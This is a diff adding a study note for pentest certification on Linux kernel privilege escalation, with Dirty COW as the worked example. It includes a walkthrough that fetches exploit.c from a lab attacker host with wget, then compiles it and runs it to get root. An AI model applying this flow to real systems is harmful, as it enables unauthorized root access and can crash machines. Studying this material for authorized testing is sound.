@@ -1,0 +1,95 @@
+🧠 Kernel Exploits – Root via Vulnerable Kernel
+🔑 Concept
+Kernel-level privilege escalation exploits vulnerabilities in the Linux kernel itself — meaning no matter what user you are, if the kernel is vulnerable and you trigger the exploit successfully, you can go straight to root.
+
+Think of kernel exploits as "god mode unlocks" — high impact, but risky due to potential system crashes or lockups.
+
+🧠 Key Facts
+Element	Description
+Target	Kernel itself (not apps, scripts, or services)
+Goal	Spawn a root shell by exploiting a kernel bug
+Famous Example	Dirty COW (CVE-2016-5195)
+Danger Level	☠️ Can crash, freeze, or corrupt the system — don’t run on prod unless safe
+Why it Works	Many legacy systems are never patched due to service/app compatibility
+Detection Precursor	uname -a to check kernel version
+🔍 Enumeration Phase
+Start with this every time:
+
+bash
+Copy
+Edit
+uname -a
+cat /etc/os-release    # or /etc/lsb-release
+This gives you:
+
+Kernel version (e.g. 4.4.0-116-generic)
+
+Distro info (e.g. Ubuntu 16.04.4 LTS)
+
+Now Google it:
+
+"linux 4.4.0-116-generic exploit"
+or
+"Ubuntu 16.04 LTS kernel exploit site:exploit-db.com"
+
+🚀 Exploitation Flow
+💣 TL;DR "Got This? Do That" Flow:
+markdown
+Copy
+Edit
+IF `uname -a` shows a known vulnerable kernel
+  ⬇
+Search Exploit-DB or GitHub for the matching kernel exploit
+  ⬇
+Download exploit to target (`wget`, `curl`, `scp`, Python HTTP server)
+  ⬇
+Compile it: `gcc exploit.c -o exploit`
+  ⬇
+Set permissions: `chmod +x exploit`
+  ⬇
+Run it: `./exploit`
+  ⬇
+You either crash the box 😅 … or land root 🏴‍☠️
+🛡️ Pro-Tips for Safety
+Tip	Why
+🧪 Run on a snapshot or throwaway box	Kernel exploits can hang or crash
+🧰 Use LinPEAS / kernel-exploits.py	They enumerate kernel versions and suggest matching exploits
+🔍 Check if it's patched	Some systems show patched kernel but still vulnerable (like in your example)
+🔂 Try multiple PoCs	Many kernel exploits have 2–3 variants floating around
+📆 Check exploit date	Use newer PoCs if older ones fail (e.g. Dirty COW from 2016 vs newer 2021 variants)
+🔧 Example Walkthrough
+You found:
+
+bash
+Copy
+Edit
+uname -a
+# Linux NIX02 4.4.0-116-generic
+Google result says: vulnerable to Dirty COW. ✅
+You find the C code on GitHub or Exploit-DB, then:
+
+bash
+Copy
+Edit
+wget http://10.10.14.3/exploit.c
+gcc exploit.c -o exploit && chmod +x exploit
+./exploit
+If successful:
+
+bash
+Copy
+Edit
+whoami
+# root
+🧠 Final Takeaways
+Kernel exploits are the nuclear option when nothing else works.
+
+They're most useful on:
+
+Legacy systems
+
+Hardened but outdated environments
+
+Great fallback to keep in your CPTS/OSCP playbook
+
+Use with care — or at the very least, snapshot first.
